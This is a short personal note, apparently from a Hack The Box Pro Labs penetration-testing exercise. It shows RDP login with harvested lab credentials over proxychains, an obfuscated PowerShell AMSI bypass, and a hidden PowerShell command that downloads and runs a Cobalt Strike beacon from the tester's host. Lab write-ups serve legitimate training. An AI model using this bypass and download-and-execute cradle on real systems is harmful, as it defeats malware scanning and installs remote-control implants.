utilized credentials found here to xfreerdp on
[[Penetration Testing v2/htb_pro_Labs/offshore/2. 172.16.1.30 - CORP-MS01/logins.xlsx]]
```bash
[root💀~/offshore/ms01/scans] [10.10.14.39] [2023-10-20 15:01:55]                                                                                        
 └─╼ # proxychains xfreerdp /u:ned.flanders_adm /d:corp.local /p:Lefthandedyeah! /v:172.16.1.36
 proxychains rdesktop -d corp.local -u ned.flanders_adm -p Lefthandedyeah! 172.16.1.36
```
once on in order to get a beacon to cobaltstrike server had to utilize an *amsi bypass*
#amsibypass 
https://gist.github.com/D3Ext/bf57673644ba08e729f65892e0dae6c4
```powershell
#obfuscated oneliner amsi bypass
$a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)
```
ran command below to get beacon after *amsi bypass*
#cobaltstrike #beacon
```bash
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.14.39:80/a'))"
```
![[Penetration Testing v2/htb_pro_Labs/offshore/3. 172.16.1.36 -CORP-WSADM/screenshots/Pasted image 20231020162744.png]]

BloodHOUND! next, CORE Impact, unable to session pass to meterpreter. 